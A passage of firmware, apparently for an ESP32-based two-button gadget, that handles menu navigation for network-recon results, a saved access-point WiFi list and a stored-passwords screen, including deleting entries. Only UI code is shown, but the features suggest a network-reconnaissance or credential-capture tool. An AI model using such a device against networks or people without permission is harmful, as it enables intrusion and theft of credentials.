    } else if (g_reconPhase == RECON_PHASE_PORT_RESULT) {
      if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
        delay(300);
        g_reconPhase = RECON_PHASE_HOST_LIST;
        drawNetworkRecon();
      }
    } else {
      reconTick();
      if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
        delay(300);
        stopNetworkRecon();
        currentState = MAIN_MENU;
        drawMainMenu();
      }
    }
  }
  else if (currentState == APWIFI_VIEW) {
    int count = apPrefs.getInt("count", 0);
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      confirmApWifiDelete = false;
      apWifiSelection++;
      if (apWifiSelection > count) apWifiSelection = 0;
      if (apWifiSelection < apWifiScrollPos) apWifiScrollPos = apWifiSelection;
      else if (apWifiSelection >= apWifiScrollPos + 3) apWifiScrollPos = apWifiSelection - 2;
      drawApWifiView();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      if (apWifiSelection == count) {
        confirmApWifiDelete = false;
        currentState = MAIN_MENU;
        drawMainMenu();
      } else if (count > 0 && apWifiSelection < count) {
        if (!confirmApWifiDelete) {
          confirmApWifiDelete = true;
          lastApWifiDeletePress = millis();
          drawApWifiView();
        } else {
          apWifiDelete(apWifiSelection);
          confirmApWifiDelete = false;
          int newCount = apPrefs.getInt("count", 0);
          if (newCount == 0) apWifiSelection = 0;
          else if (apWifiSelection >= newCount) apWifiSelection = newCount;
          apWifiScrollPos = 0;
          drawApWifiView();
        }
      }
    }
    if (confirmApWifiDelete && millis() - lastApWifiDeletePress > 3000) {
      confirmApWifiDelete = false;
      drawApWifiView();
    }
  }
  else if (currentState == VIEW_PASSWORDS) {
    int total = prefs.getInt("pwd_count", 0);
    int maxSelection = total + 1;
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200); confirmDeleteAll = false;
      viewSelection++;
      if (viewSelection > maxSelection) viewSelection = 0;
      if (viewSelection < total) {
        if (viewSelection >= viewScrollPos + 2) viewScrollPos = viewSelection - 1;
        else if (viewSelection < viewScrollPos) viewScrollPos = viewSelection;
      }
      drawViewPasswords();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      if (viewSelection == maxSelection) { currentState = MAIN_MENU; drawMainMenu(); }
      else if (viewSelection == total) {
        if (!confirmDeleteAll) { confirmDeleteAll = true; lastDeletePress = millis(); drawViewPasswords(); }
        else { deleteAllPasswordsFromNVS(); confirmDeleteAll = false; viewSelection = 1; viewScrollPos = 0; drawViewPasswords(); }
      }
      else if (viewSelection < total) {
        deletePasswordEntry(viewSelection);
        confirmDeleteAll = false;
        int newTotal = prefs.getInt("pwd_count", 0);
        if (newTotal == 0) viewSelection = 1;
        else if (viewSelection >= newTotal) viewSelection = newTotal - 1;
        viewScrollPos = 0;
        drawViewPasswords();
      }
    }
    if (confirmDeleteAll && millis() - lastDeletePress > 3000) {
      confirmDeleteAll = false; drawViewPasswords();
    }
  }
}